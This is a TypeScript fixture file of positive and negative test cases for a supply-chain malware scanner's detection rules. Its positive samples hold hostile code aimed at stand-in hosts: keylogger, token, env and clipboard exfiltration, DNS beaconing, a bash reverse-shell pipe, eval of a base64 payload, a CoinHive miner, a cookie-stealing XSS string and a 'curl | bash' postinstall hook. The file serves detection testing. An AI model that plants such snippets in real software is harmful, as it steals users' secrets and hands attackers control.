import type { RuleCase } from "./types.js";

export const cases: RuleCase[] = [
  {
    ruleId: "DESTRUCTIVE_COMMAND",
    check: "supply-chain-deep",
    positive: {
      file: "src/scripts/workspace-cleanup.ts",
      content: `import { execSync } from "child_process";\n\nexport function nukeTempDir(dir: string): void {\n  execSync("rm -rf " + dir);\n}\n`
    },
    negative: {
      file: "src/scripts/workspace-cleanup.ts",
      content: `import fs from "fs";\nimport { execSync } from "child_process";\n\nconst SAFE_TMP_PREFIX = "/tmp/app-cache/";\n\nexport function buildProject(): void {\n  execSync("npm run build");\n}\n\nexport function cleanTempFile(filePath: string): void {\n  if (!filePath.startsWith(SAFE_TMP_PREFIX)) {\n    throw new Error("refusing to delete outside temp directory");\n  }\n  fs.rmSync(filePath, { recursive: false });\n}\n`
    },
    note: "Negative scopes deletion to a single file inside an explicit allowlisted prefix with a guard clause, and never combines exec/execSync with rm -rf or a bare recursive fs.rm(...) call: it uses fs.rmSync (which the fs.rm|rmdir|unlink|writeFile|truncate alternation does not match) on a validated path."
  },
  {
    ruleId: "EXIT_WITH_DESTRUCTION",
    check: "supply-chain-deep",
    positive: {
      file: "src/scripts/audit-purge.ts",
      content: `import fs from "fs";\n\nexport function purgeAuditLogs(logDir: string): void {\n  fs.rmSync(logDir, { recursive: true }) && process.exit(1);\n}\n`
    },
    negative: {
      file: "src/scripts/audit-purge.ts",
      content: `import fs from "fs";\n\nexport function purgeAuditLogs(logDir: string): void {\n  try {\n    fs.rmSync(logDir, { recursive: true });\n  } finally {\n    console.log("audit log purge complete");\n  }\n}\n`
    },
    note: "Negative moves the deletion into a try/finally block with no process.exit() anywhere in the file, the exact fix requiredActions calls for, instead of chaining deletion directly into an exit call on the same line."
  },
  {
    ruleId: "HIDDEN_FILE_WRITE",
    check: "supply-chain-deep",
    positive: {
      file: "src/updater/stash.ts",
      content: `import fs from "fs";\n\nexport function stashPayload(data: string): void {\n  fs.writeFileSync(".sysupdate", data);\n}\n`
    },
    negative: {
      file: "src/updater/stash.ts",
      content: `import fs from "fs";\nimport path from "path";\n\nconst CONFIG_DIR = "/var/lib/app/state";\n\nexport function saveUpdateState(data: string): void {\n  fs.writeFileSync(path.join(CONFIG_DIR, "update-state.json"), data);\n}\n`
    },
    note: "Negative writes to a documented, non-hidden path built from path.join(CONFIG_DIR, ...) rather than a bare hidden-dotfile string literal, so the rule's ['\"]\\.[./]* literal-path match never engages (the first argument is no longer a quoted string starting with a dot)."
  },
  {
    ruleId: "KEYLOGGER_EXFIL",
    check: "supply-chain-deep",
    positive: {
      file: "src/widgets/shortcuts.js",
      content: `document.addEventListener("keydown", (e) => fetch("https://evil.example.com/collect?k=" + e.key));\n`
    },
    negative: {
      file: "src/widgets/shortcuts.js",
      content: `document.addEventListener("keydown", (e) => {\n  if (e.key === "/") {\n    e.preventDefault();\n    focusSearchInput();\n  }\n});\n`
    },
    note: "Negative is a real keyboard-shortcut handler (focus search on '/') with no fetch/XHR/sendBeacon anywhere near the listener, versus the positive's braceless arrow function that pipes e.key straight into a fetch call on the same line."
  },
  {
    ruleId: "CREDENTIAL_EXFILTRATION",
    check: "supply-chain-deep",
    positive: {
      file: "src/widgets/session-sync.js",
      content: `export function syncSession() {\n  localStorage.getItem("session_token") && fetch("https://telemetry.example-cdn.net/beacon?data=" + localStorage.getItem("session_token"));\n}\n`
    },
    negative: {
      file: "src/widgets/session-sync.js",
      content: `export function restoreDraft() {\n  const draft = localStorage.getItem("draft_text");\n  if (draft) {\n    document.getElementById("editor").value = draft;\n  }\n}\n`
    },
    note: "Negative reads localStorage only to repopulate a local DOM field; it never appears on the same line as (or anywhere near) a fetch/XHR/axios/sendBeacon call, so the storage-read-then-network-send shape the rule targets is absent entirely."
  },
  {
    ruleId: "ENV_VARIABLE_EXFILTRATION",
    check: "supply-chain-deep",
    positive: {
      file: "src/telemetry/report-env.js",
      content: `export function exfiltrateEnv() {\n  process.env && fetch("https://collector.example.net/ingest?env=" + encodeURIComponent(JSON.stringify(process.env)));\n}\n`
    },
    negative: {
      file: "src/telemetry/report-env.js",
      content: `export function configureApiClient() {\n  const apiKey = process.env.INTERNAL_API_KEY;\n  return new ApiClient({ apiKey, baseUrl: INTERNAL_BASE_URL });\n}\n`
    },
    note: "Negative reads a single named env var into a typed config object and never sends process.env (or any derived value) to a network call on that statement: the process.env reference and the ApiClient construction never co-occur with fetch/axios/http on the same line."
  },
  {
    ruleId: "DNS_EXFILTRATION",
    check: "supply-chain-deep",
    positive: {
      file: "src/net/beacon.js",
      content: `export function beaconEnvViaDns(secretValue) {\n  dns.resolve4(encodeURIComponent(secretValue) + ".c2.attacker-domain.net", () => {});\n}\n`
    },
    negative: {
      file: "src/net/beacon.js",
      content: `export function checkServiceHealth() {\n  dns.resolve4("api-internal.example.com", (err, addresses) => {\n    console.log(addresses);\n  });\n}\n`
    },
    note: "Negative resolves a static, hardcoded hostname string literal; the rule requires process.env/btoa/Buffer.from(...base64...)/encodeURIComponent/.replace( to appear inside the dns.resolve4(...) argument list, none of which are present here."
  },
  {
    ruleId: "CLIPBOARD_EXFILTRATION",
    check: "supply-chain-deep",
    positive: {
      file: "src/widgets/clipboard-sync.js",
      content: `navigator.clipboard.readText().then((text) => fetch("https://exfil.example.net/clip", { method: "POST", body: text }));\n`
    },
    negative: {
      file: "src/widgets/clipboard-sync.js",
      content: `navigator.clipboard.readText().then((text) => {\n  document.getElementById("paste-target").value = text;\n});\n`
    },
    note: "Negative uses the read clipboard text only to populate a local input field; no fetch/XMLHttpRequest/sendBeacon/WebSocket/axios token appears anywhere after the clipboard read, unlike the positive's braceless arrow that pipes straight into fetch."
  },
  {
    ruleId: "REVERSE_SHELL",
    check: "supply-chain-deep",
    positive: {
      file: "src/services/remote-shell.js",
      content: `const { spawn } = require("child_process");\n\nexport function handleRemoteCommand(socket) {\n  const shell = spawn("/bin/bash", ["-i"]);\n  shell.stdout.pipe(socket);\n  socket.pipe(shell.stdin);\n}\n`
    },
    negative: {
      file: "src/services/remote-shell.js",
      content: `const { spawn } = require("child_process");\n\nexport function runLinter(filePath) {\n  const proc = spawn("eslint", [filePath, "--fix"]);\n  proc.stdout.pipe(process.stdout);\n}\n`
    },
    note: "Negative spawns a fixed, known binary (eslint) with an argument array and no shell path; none of /bin/bash, /bin/sh, cmd.exe, or powershell ever appear on the same line as spawn, so the child_process+shell-binary alternation never fires."
  },
  {
    ruleId: "CHILD_PROCESS_EXEC_SHELL",
    check: "supply-chain-deep",
    positive: {
      file: "src/build/run-command.js",
      content: `const { spawn } = require("child_process");\n\nexport function runBuildCommand(cmdString) {\n  spawn(cmdString, { shell: true });\n}\n`
    },
    negative: {
      file: "src/build/run-command.js",
      content: `const { execFile } = require("child_process");\n\nexport function runBuildCommand(binaryPath, args) {\n  execFile(binaryPath, args, { shell: false });\n}\n`
    },
    note: "Negative uses execFile (not exec/execSync) with an array of args and shell:false; 'exec' only appears as the substring prefix of 'execFile', which fails the rule's \\s*\\( requirement right after the exec/execSync alternation, and 'shell: false' never matches the literal shell\\s*:\\s*true pattern."
  },
  {
    ruleId: "BASE64_OBFUSCATED_EXEC",
    check: "supply-chain-deep",
    positive: {
      file: "scripts/build-helper.js",
      content: `function bootstrapPlugin() {\n  [Buffer.from("ZnVuY3Rpb24gc3RlYWxDcmVkZW50aWFscygpIHsgcmV0dXJuIGZldGNoKCJodHRwOi8vZXZpbC5jb20iKTsgfQ==", "base64").toString("utf8")].map(eval);\n}\n`
    },
    negative: {
      file: "scripts/build-helper.js",
      content: `function loadEncodedConfig() {\n  const configJson = Buffer.from("eyJhcGlVcmwiOiJodHRwczovL2FwaS5leGFtcGxlLmNvbSIsInRpbWVvdXQiOjUwMDB9", "base64").toString("utf8");\n  return JSON.parse(configJson);\n}\n`
    },
    note: "Negative decodes a base64 config blob and only JSON.parse()s it; eval/exec/spawn/Function never appear on the same line as the Buffer.from(...,'base64') call, so the decode-then-execute shape the rule targets never completes."
  },
  {
    ruleId: "CRYPTOMINER_DETECTED",
    check: "supply-chain-deep",
    positive: {
      file: "src/widgets/analytics.js",
      content: `const stratumUrl = "stratum+tcp://xmr-pool.example.com:3333";\nconst miner = new CoinHive.Anonymous("SITE_KEY");\nminer.start();\n`
    },
    negative: {
      file: "src/widgets/analytics.js",
      content: `const worker = new Worker("image-processor.js");\nworker.postMessage({ action: "resize", image: imageData });\n`
    },
    note: "Negative delegates real CPU work to a plain Web Worker with no reference to any cryptomining library, pool protocol, or coin name; none of the rule's literal keywords (CoinHive, stratum+tcp, xmrig, monero, etc.) appear anywhere in the file."
  },
  {
    ruleId: "OBFUSCATED_DOM_INJECTION",
    check: "supply-chain-deep",
    positive: {
      file: "src/widgets/render-card.js",
      content: `document.write(atob("PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmNvb2tpZSk+"));\n`
    },
    negative: {
      file: "src/widgets/render-card.js",
      content: `const template = document.getElementById("card-template").innerHTML;\ncontainer.insertAdjacentHTML("beforeend", sanitizeHtml(template));\n`
    },
    note: "Negative inserts a sanitizeHtml()-passed template; the first ')' the rule scans for (closing sanitizeHtml's call) is reached before any of atob/unescape/String.fromCharCode/\\x../\\u.. appears, so the [^)]* run never reaches a matching keyword."
  },
  {
    ruleId: "EVAL_DYNAMIC_ARG",
    check: "supply-chain-deep",
    positive: {
      file: "src/utils/expression.js",
      content: `export function runExpression(userInput) {\n  return eval(userInput);\n}\n`
    },
    negative: {
      file: "src/utils/expression.js",
      content: `export function runExpression(serializedValue) {\n  return JSON.parse(serializedValue);\n}\n`
    },
    note: "Negative removes eval() entirely and uses JSON.parse() instead, precisely the fix requiredActions recommends; with no eval( token anywhere in the file the codeSearch pattern has nothing to match."
  },
  {
    ruleId: "REQUIRE_NON_LITERAL",
    check: "supply-chain-deep",
    positive: {
      file: "src/plugins/loader.js",
      content: `export function loadHandler(handlerName) {\n  return require(handlerName);\n}\n`
    },
    negative: {
      file: "src/plugins/loader.js",
      content: `const HANDLERS = {\n  json: require("./handlers/json.js"),\n  xml: require("./handlers/xml.js"),\n};\n\nexport function loadHandler(handlerName) {\n  const handler = HANDLERS[handlerName];\n  if (!handler) throw new Error("unknown handler");\n  return handler;\n}\n`
    },
    note: "Negative is the exact static-allowlist fix from requiredActions: every require() call takes a quoted string literal, so the identifier/template-literal alternation in the rule's regex never matches. Only HANDLERS[handlerName] (not a require() call) is dynamic."
  },
  {
    ruleId: "DYNAMIC_IMPORT_NON_LITERAL",
    check: "supply-chain-deep",
    positive: {
      file: "src/plugins/async-loader.js",
      content: `export async function loadPlugin(pluginName) {\n  const mod = await import(pluginName);\n  return mod.default;\n}\n`
    },
    negative: {
      file: "src/plugins/async-loader.js",
      content: `const ALLOWED_PLUGINS = {\n  pdf: () => import("./plugins/pdf.js"),\n  csv: () => import("./plugins/csv.js"),\n};\n\nexport async function loadPlugin(pluginName) {\n  const loader = ALLOWED_PLUGINS[pluginName];\n  if (!loader) throw new Error("unknown plugin");\n  return (await loader()).default;\n}\n`
    },
    note: "Negative is the ALLOWED map pattern requiredActions prescribes verbatim: both import(...) calls take quoted string-literal specifiers, which the rule's own exclusion filter (import('literal')) strips out, and ALLOWED_PLUGINS[pluginName] is a plain object index, not an import() call."
  },
  {
    ruleId: "POSTINSTALL_NETWORK_REQUEST",
    check: "supply-chain-deep",
    positive: {
      file: "package.json",
      content: `{\n  "name": "my-widget",\n  "version": "1.0.0",\n  "scripts": {\n    "postinstall": "curl -fsSL https://cdn.example-installer.net/setup.sh | bash"\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "my-widget",\n  "version": "1.0.0",\n  "scripts": {\n    "postinstall": "node ./scripts/verify-native-build.js"\n  }\n}\n`
    },
    note: "Negative's postinstall runs a bundled local Node script with no curl/wget/fetch/axios/http(s):/got/request/node-fetch token anywhere in the script string, so the rule's keyword alternation inside the quoted postinstall value never matches."
  },
  {
    ruleId: "WILDCARD_DEPENDENCY_VERSION",
    check: "supply-chain-deep",
    positive: {
      file: "package.json",
      content: `{\n  "name": "my-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "left-pad": "*"\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "my-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "left-pad": "1.3.0"\n  }\n}\n`
    },
    note: "Negative pins left-pad to an exact semver (1.3.0); the rule only matches values that are literally *, latest, x.x.x, or >=0.0.0, none of which an exact pinned version satisfies."
  },
  {
    ruleId: "GITHUB_ACTIONS_MUTABLE_REF",
    check: "supply-chain-deep",
    positive: {
      file: ".github/workflows/ci.yml",
      content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test\n`
    },
    negative: {
      file: ".github/workflows/ci.yml",
      content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n      - run: npm test\n`
    },
    note: "Negative pins the action to a full 40-character lowercase-hex commit SHA (with the tag kept only as a trailing comment), which satisfies the rule's own mutableRefRe exclusion pattern, unlike the positive's mutable @v4 tag ref."
  },
  {
    ruleId: "DOCKER_UNPINNED_BASE_IMAGE",
    check: "supply-chain-deep",
    positive: {
      file: "Dockerfile",
      content: `FROM node:20-alpine\n\nWORKDIR /app\nCOPY . .\nRUN npm ci\nCMD ["node", "index.js"]\n`
    },
    negative: {
      file: "Dockerfile",
      content: `FROM node:20-alpine@sha256:c6bffa9be3f7ca5c1e3e8f5e4c1c1feee7bacd3b4b34d0f3a8b7fda3e6b3af7b\n\nWORKDIR /app\nCOPY . .\nRUN npm ci\nCMD ["node", "index.js"]\n`
    },
    note: "Negative's FROM line contains an @sha256: digest, which trips the rule's (?!.*@sha256:) negative lookahead and removes the line from matching entirely, unlike the positive's bare mutable :20-alpine tag."
  }
];
